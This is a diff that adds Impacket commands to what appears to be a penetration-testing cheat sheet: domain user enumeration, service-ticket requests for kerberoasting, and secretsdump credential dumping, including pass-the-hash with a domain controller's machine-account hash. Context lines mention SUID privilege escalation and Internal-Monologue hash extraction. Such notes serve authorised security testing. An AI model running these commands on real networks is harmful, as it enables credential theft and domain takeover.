@@ -31,6 +31,15 @@
   * searches the given path (recursively) for what you entered
   * the last example finds SUID files, which can sometimes be used for privilege escalation
 
+# [Impacket](https://github.com/SecureAuthCorp/impacket):
+#### `python3 GetADUsers.py --dc-ip X.X.X.X <FQDN>/<username>:<password>`
+#### `python3 GetUserSPNs.py --dc-ip X.X.X.X <FQDN>/<username>:<password>`
+#### `python3 secretsdump.py --dc-ip X.X.X.X <FQDN>/<username>:<password>@Y.Y.Y.Y`
+#### `python3 secretsdump.py -hashes <ntlm_hash> --dc-ip X.X.X.X --just-dc <FQDN>/DC1\$@Y.Y.Y.Y`
+  * The scripts listed above are in the `/impacket/examples` directory
+  * The secretsdump script can have Y.Y.Y.Y = X.X.X.X but doesn't have to
+  * In the last example it uses the DC's computer account NTLM hash instead of a user/pass
+
 # [Internal-Monologue](https://github.com/eladshamir/Internal-Monologue):
 #### `Internal-Monolgue.exe`
 #### `msbuild InternalMonologue.sln -p:TargetFrameworkVersion=v4.5`
